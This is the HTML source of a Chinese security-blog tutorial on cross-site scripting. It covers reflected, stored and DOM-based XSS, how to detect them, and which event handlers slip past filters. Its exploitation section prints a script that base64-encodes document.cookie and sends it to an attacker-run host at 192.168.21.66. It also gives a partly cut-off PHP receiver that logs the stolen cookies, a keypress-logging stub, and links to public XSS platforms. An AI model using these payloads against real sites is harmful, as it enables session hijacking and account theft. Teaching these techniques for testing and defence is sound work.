@@ -1,0 +1,1140 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>XSS</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="XSS">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/XSS/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-08-05">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-08-12">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="XSS">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      XSS
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-08-05T04:52:06.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-08-05</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/Web%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          Web渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>2.1k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/XSS/" 
+            class="post-meta-link">
+            XSS
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="一、XSS漏洞的概述"><a href="#一、XSS漏洞的概述" class="headerlink" title="一、XSS漏洞的概述"></a>一、XSS漏洞的概述</h1><p>漏洞的介绍</p>
+<p>XSS又叫CSS(CrossSiteScript)，全称跨站脚本攻击。它指的是攻击者往Web页面或者URL里插入恶意JavaScript脚本代码，如果Web应用程序对于用户输入的内容没有过滤，那么当正常用户浏览该网页的时候，嵌入在Web页面里的恶意JavaScript脚本代码会被执行，从而达到恶意攻击正常用户的目的。</p>
+<table>
+<thead>
+<tr>
+<th align="left">漏洞的位置</th>
+<th align="left"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">数据交互的地方</td>
+<td align="left">1、get post cookies headers方法 <br>2、富文本编辑器 <br>3、各类标签插入和自定义</td>
+</tr>
+<tr>
+<td align="left">数据输出的地方</td>
+<td align="left">1、用户资料 <br>2、关键词、标签、说明</td>
+</tr>
+<tr>
+<td align="left">漏洞前提</td>
+<td align="left">1、可以控制的输入点 <br>2、输入能返回到前端页面上被浏览器当成脚本语言解释执行</td>
+</tr>
+</tbody></table>
+<h1 id="二、XSS危害"><a href="#二、XSS危害" class="headerlink" title="二、XSS危害"></a>二、XSS危害</h1><p>窃取用户Cookie，冒充用户身份进入网站（常见）</p>
+<p>键盘记录</p>
+<p>客户端信息探查</p>
+<p>XSS getshell</p>
+<p>劫持用户会话，执行任意操作</p>
+<p>刷流量，执行弹窗广告</p>
+<p>传播蠕虫病毒</p>
+<p>…..</p>
+<h1 id="三、XSS检测"><a href="#三、XSS检测" class="headerlink" title="三、XSS检测"></a>三、XSS检测</h1><h2 id="1、手工检测XSS"><a href="#1、手工检测XSS" class="headerlink" title="1、手工检测XSS"></a>1、手工检测XSS</h2><p>使用手工检测XSS漏洞是否存在时，最重要考虑的是哪里有输入、输入的数据在什么地方输出。</p>
+<p>1、可得知输出位置</p>
+<p>输入一些敏感字符，例如<code>&lt;、&gt;、&quot;、&#39;、()</code>等，请求后查看HTML源码，看这些输入的字符是否被转义</p>
+<p>2、无法得知输出位置</p>
+<p>非常多的web应用程序源代码不对外公开，这时在测试XSS时就有可能无法得知输入数据到底在何处显示，比如，测试某留言板是否存在XSS，那么在留言之后，可能需要经过管理员的审核才能显示，这时无法得知输入的数据在后台管理页面处于什么状态</p>
+<h2 id="2、自动检测XSS"><a href="#2、自动检测XSS" class="headerlink" title="2、自动检测XSS"></a>2、自动检测XSS</h2><p>APPSCAN、AWVS、BurpSuite等软件，都可以有效地检测XSS漏洞，但这类大型的漏扫工具除了检测XSS外，还会检测SQL注入、文件包含等漏洞，所以效率比较低。专业的XSS扫描工具可以更准确的扫描XSS漏洞，如：XSSER、XSSF。</p>
+<p>工具与手动相结合，才能更好地检测XSS，比如：在扫描XSS时，很多扫描器一般无法检测非常规的XSS漏洞，因为在提交留言时可能需要短信验证，验证码填写等，这是工具无法做到的。</p>
+<p>页面中js代码执行位置（4个–两个标签外、两个标签内）</p>
+<table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td align="left">script标签中执行 –标签外（如body中） 推荐（不用点击，直接触发）*</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;script src=&quot;x.js&quot;&gt;&lt;/script&gt;</code></td>
+<td align="left">调用执行 –标签外</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code></td>
+<td align="left">伪协议触发（javascript不可少）–标签内</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;p onclick=&quot;alert(1)&quot;&gt;&lt;/p&gt;</code></td>
+<td align="left">事件触发 –标签内 *</td>
+</tr>
+</tbody></table>
+<p><strong>HTML实体编码</strong></p>
+<p>若实体编码，则不存在xss漏洞。常见&lt;&gt;分别为&lt;&gt;</p>
+<p>注意：需要查看源码，不要用F12</p>
+<p>1、标签中不显示其他标签</p>
+<p>2、多个空格只显示一个，可用 代替空格显示。</p>
+<p>以&amp;开头;结尾，中间放特殊字符的英文简写或16进制数字。</p>
+<p><strong>分类</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">存储区</th>
+<th align="left">插入点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">反射型 XSS</td>
+<td align="left">URL</td>
+<td align="left">HTML</td>
+</tr>
+<tr>
+<td align="left">存储型 XSS</td>
+<td align="left">后端数据库</td>
+<td align="left">HTML</td>
+</tr>
+<tr>
+<td align="left">DOM型 XSS</td>
+<td align="left">后端数据库/前端存储/URL前端</td>
+<td align="left">JavaScript</td>
+</tr>
+</tbody></table>
+<h1 id="四、反射型XSS"><a href="#四、反射型XSS" class="headerlink" title="四、反射型XSS"></a>四、反射型XSS</h1><p><strong>概念：</strong></p>
+<p>是非持久性、参数型的跨站脚本。反射型XSS的JS代码在Web应用的参数（变量）中，如搜索框的反射型XSS。</p>
+<p><strong>存在位置</strong>：</p>
+<p>常见于通过URL传递参数的功能，如网站搜索、跳转等。</p>
+<p><strong>攻击手法：</strong></p>
+<p>需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
+<p>反射型xss漏洞poc：</p>
+<pre class="highlight"><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;（常用）</span><br><span class="line"></span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre>
+
+<h1 id="五、存储型XSS"><a href="#五、存储型XSS" class="headerlink" title="五、存储型XSS"></a>五、存储型XSS</h1><p><strong>概念：</strong></p>
+<p>持久性跨站脚本，是三种XSS中危害最大的。它是将恶意代码写进数据库或文件等可以永久保存数据的介质中。</p>
+<p><strong>存在位置：</strong></p>
+<p>常出现在留言板、发表评论或发表文章的地方(数据写入的地方)。</p>
+<p><strong>攻击手法：</strong></p>
+<p>通过留言板等功能，将攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。</p>
+<p><strong>存储型xss漏洞poc：</strong></p>
+<p>同反射型xss</p>
+<h1 id="六、DOM型XSS"><a href="#六、DOM型XSS" class="headerlink" title="六、DOM型XSS"></a>六、DOM型XSS</h1><p><strong>DOM的意思：</strong></p>
+<p>DOM文档对象模型(DocumentObjeetModel,DOM)是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式</p>
+<p><strong>漏洞概念</strong>：</p>
+<p>不经过后端，DOM-XSS漏洞是基于文档对象模型的一种漏洞，简单去理解就是因为输出点在DOM。DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
+<p><strong>攻击手法：</strong></p>
+<p>攻击者构造出特殊的URL，其中包含恶意代码。用户打开带有恶意代码的URL用户浏览器接收到响应后解析执行，前端JavaScript取出URL中的恶意代码并执行。恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作</p>
+<p><strong>常用DOM方法</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">getElementById()</td>
+<td align="left">返回带有指定ID的元素</td>
+</tr>
+<tr>
+<td align="left">getElementsByTagName()</td>
+<td align="left">返回带有指定标签的所有元素的节点列表</td>
+</tr>
+<tr>
+<td align="left">getElementsByClassName()</td>
+<td align="left">返回包含带有指定类名的所有元素的节点列表</td>
+</tr>
+<tr>
+<td align="left">appendchild()</td>
+<td align="left">把新节点添加到指定节点</td>
+</tr>
+<tr>
+<td align="left">removeChild()</td>
+<td align="left">删除子节点</td>
+</tr>
+<tr>
+<td align="left">replaceChild()</td>
+<td align="left">替换子节点</td>
+</tr>
+<tr>
+<td align="left">insertBefore()</td>
+<td align="left">在指定的子节点前面插入新的子节点</td>
+</tr>
+<tr>
+<td align="left">createAttribute()</td>
+<td align="left">创建属性节点</td>
+</tr>
+<tr>
+<td align="left">createElement()</td>
+<td align="left">创建元素节点</td>
+</tr>
+</tbody></table>
+<p><strong>DOM型XSS漏洞poc</strong></p>
+<pre class="highlight"><span class="line">?message=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre>
+
+<p><strong>三种漏洞的区别</strong></p>
+<p>存储型XSS与反射型XSS的区别</p>
+<p>存储型XSS的恶意代码存在数据库里，反射型XSS的恶意代码存在URL里</p>
+<p><strong>DOM型与其他两种XSS的区别</strong></p>
+<p>DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端JavaScript自身的安全漏洞，而其他两种XSS都属于服务端的安全漏洞</p>
+<h1 id="七、XSS漏洞测试过程"><a href="#七、XSS漏洞测试过程" class="headerlink" title="七、XSS漏洞测试过程"></a>七、XSS漏洞测试过程</h1><p>1、判断是否是html实体编码(查看源代码)</p>
+<p>单双引号尖括号等，是否转义</p>
+<p><code>&#39;&quot;&lt;&gt;()</code></p>
+<p>2、确定输出位置</p>
+<p>3、判断闭合符</p>
+<p>标签外，直接使用</p>
+<p>标签内，需要闭合标签</p>
+<p>4、绕过waf</p>
+<table>
+<thead>
+<tr>
+<th align="left">标签</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">a标签</td>
+<td align="left">存在onclick、onmousemove等事件，无onerror事件</td>
+</tr>
+<tr>
+<td align="left">img标签</td>
+<td align="left">存在onerror、onclick、onmousemove等事件</td>
+</tr>
+<tr>
+<td align="left">input标签</td>
+<td align="left">存在onchange、onmousemove等事件，无onload、onerror事件</td>
+</tr>
+<tr>
+<td align="left">svg标签</td>
+<td align="left">存在onload、onclick、onmousemove等事件</td>
+</tr>
+</tbody></table>
+<p>注：onload、onerror会在页面加载完成之后立刻触发，其他都要手动触发。优先选择自动触发事件。</p>
+<h1 id="八、XSS简单利用"><a href="#八、XSS简单利用" class="headerlink" title="八、XSS简单利用"></a>八、XSS简单利用</h1><p>1、XSS获取管理员权限(获取cookie)——重要</p>
+<p>2、XSS键盘记录——重要</p>
+<p>3、XSS获取内网IP</p>
+<p>XSS获取cookie</p>
+<pre class="highlight"><span class="line">alert(document.cookie)</span><br></pre>
+
+<p><strong>自动发送请求的标签</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">语句</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;&quot;&gt;</code></td>
+<td align="left">链接标签</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;img src=&quot;&quot;&gt;</code></td>
+<td align="left">图片标签</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;script src=&quot;&quot;&gt;&lt;/script&gt;</code></td>
+<td align="left">script标签</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;iframe src=&quot;&quot;&gt;&lt;/iframe&gt;</code></td>
+<td align="left">内联框架标签</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;video src=&quot;&quot;&gt;&lt;/video&gt;</code></td>
+<td align="left">视频标签</td>
+</tr>
+<tr>
+<td align="left"><code>&lt;audio src=&quot;&quot;&gt;&lt;/audio&gt;</code></td>
+<td align="left">音频标签</td>
+</tr>
+</tbody></table>
+<p>通过自发送标签，将cookie值base64编码后，发送到自己的服务器，即可获取目标cookie信息</p>
+<p>使用<code>&lt;script src=http:\\xxx&gt;&lt;/script&gt;</code>加载压缩后的短网址，访问js文件</p>
+<table>
+<thead>
+<tr>
+<th align="left">说明</th>
+<th align="left">语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">发送js</td>
+<td align="left"><code>s=document.createElement(&#39;script&#39;);s.src=&#39;http://192.168.21.66:9999/cookie.php?cookie=&#39; + btoa(document.cookie);document.body.appendChild(s);</code></td>
+</tr>
+<tr>
+<td align="left">接收php</td>
+<td align="left">`&lt;?php if ($_GET[‘cookie’]) { file_put_contents(‘cookie.txt’, “IP:” . $_SERVER[‘REMOTE_ADDR’] . “\nCookie: “ . base64_decode($_GET[‘cookie’]) . “\n\n”, FILE_APPEND</td>
+</tr>
+</tbody></table>
+<p><strong>XSS获取键盘记录</strong></p>
+<pre class="highlight"><span class="line">window.onkeypress=function(key)&#123;</span><br><span class="line"></span><br><span class="line">console.log(key);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
+
+<p>公开的XSS平台</p>
+<p><a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt</a></p>
+<p><a target="_blank" rel="noopener" href="https://xsshs.cn/">https://xsshs.cn</a></p>
+<p>当<code>&lt;script&gt;</code>标签无法使用时，可用其他标签使用dom操作，生成</p>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/XSS/">
+            https://www.zerochen.top/article/XSS/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/article/CSRF/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">CSRF </div>
+          
+        </div>
+      </a>
+    </div>
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">命令执行 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: 'Just go go',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A6%82%E8%BF%B0"><span class="toc-text">一、XSS漏洞的概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、XSS危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81XSS%E6%A3%80%E6%B5%8B"><span class="toc-text">三、XSS检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%89%8B%E5%B7%A5%E6%A3%80%E6%B5%8BXSS"><span class="toc-text">1、手工检测XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8BXSS"><span class="toc-text">2、自动检测XSS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">四、反射型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">五、存储型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81DOM%E5%9E%8BXSS"><span class="toc-text">六、DOM型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-text">七、XSS漏洞测试过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81XSS%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="toc-text">八、XSS简单利用</span></a></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">谨言多思，野蛮生长</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>43</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>9</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>43</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A6%82%E8%BF%B0"><span class="toc-text">一、XSS漏洞的概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81XSS%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、XSS危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81XSS%E6%A3%80%E6%B5%8B"><span class="toc-text">三、XSS检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%89%8B%E5%B7%A5%E6%A3%80%E6%B5%8BXSS"><span class="toc-text">1、手工检测XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8BXSS"><span class="toc-text">2、自动检测XSS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-text">四、反射型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-text">五、存储型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81DOM%E5%9E%8BXSS"><span class="toc-text">六、DOM型XSS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-text">七、XSS漏洞测试过程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB%E3%80%81XSS%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="toc-text">八、XSS简单利用</span></a></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">6</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
